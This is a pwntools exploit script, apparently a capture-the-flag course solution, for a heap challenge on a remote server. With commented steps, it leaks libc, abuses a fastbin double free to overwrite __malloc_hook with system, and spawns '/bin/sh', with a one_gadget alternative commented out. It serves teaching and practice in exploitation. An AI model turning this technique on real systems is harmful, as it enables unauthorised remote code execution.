from pwn import *

# r = process('./note')
r = remote('edu-ctf.csie.org', 10178)
elf = ELF('./libc-2.23.so')

def add(size, data):
    r.sendafter('> ', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', data)

def show(index):
    r.sendafter('> ', '2')
    r.sendafter('Which note do you want to show?\nIndex: ', str(index))

def delete(index):
    r.sendafter('> ', '3')
    r.sendafter('Which note do you want to delete?\nIndex: ', str(index))

# 0x100 is small bin, so it will become unsorted bin after freed.
add(0x100, 'leak')
add(0x68, 'b')
add(0x68, 'c')

# unsorted bin's fd point to libc's address, so we can leak.
delete(0)
show(0)
r.recvline()
elf.address = u64(r.recv(6) + '\0\0') - 0x3c4b78
success(hex(elf.address))

# double free to control fast bin's fd
delete(1)
delete(2)
delete(1)

# control fast bin's fd, so after malloc three times, then the forth time we can get the address we put into the fast bin's fd
add(0x68, p64(elf.symbols.__malloc_hook - 0x10 - 3))
add(0x68, 'junk')
add(0x68, 'junk')

# first way: system("/bin/sh") to get the shell
add(0x68, 'aaa' + p64(elf.symbols.system))
r.sendafter('> ', '1')
r.sendafter('Size: ', str(elf.search('/bin/sh').next()))

# second way: double free corruption to cause error and satisfy the one_gadget condition because there is malloc in error.
'''
add(0x68, 'aaa' + p64(elf.address + 0xf02a4))
delete(1)
delete(1)
'''

r.interactive()
